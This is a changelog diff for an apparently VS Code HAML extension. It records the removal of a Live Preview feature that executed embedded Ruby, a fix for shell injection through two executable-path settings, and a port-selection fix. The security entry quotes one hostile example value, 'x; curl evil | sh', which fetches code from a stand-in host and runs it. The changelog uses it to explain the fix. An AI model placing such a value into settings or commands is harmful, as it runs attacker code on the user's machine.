@@ -2,9 +2,9 @@
 
 ## [Unreleased]
 
+- **Remove**: The Live Preview feature (`HAML: Open Live Preview` command) has been removed. Rendering a HAML template executes the Ruby embedded in it, so previewing a `.haml` file from an untrusted repository could run arbitrary code; the webview also rendered the compiled HTML without a Content-Security-Policy. The feature is dropped rather than sandboxed.
 - **Security**: The `haml-lint` and Rails executable checks no longer run through a shell, so a value like `x; curl evil | sh` in the `hamlAll.linterExecutablePath` / `railsRoutes.railsCommand` settings can no longer inject shell commands. These two settings are now machine-scoped (they can only be set in your user settings, not by a workspace's `.vscode/settings.json`), and the extension declares limited support for untrusted workspaces so it stays in Restricted Mode until you trust the folder.
 - **Fix**: The linting server now selects its port by binding directly (retrying on conflict) instead of shelling out to `lsof`, which is unavailable on Windows and could prevent the server from starting.
-- **Fix**: A HAML syntax error in the compile/preview action now returns an error response instead of interrupting the linting server.
 
 ## [3.0.0] - 2026-07-04
 
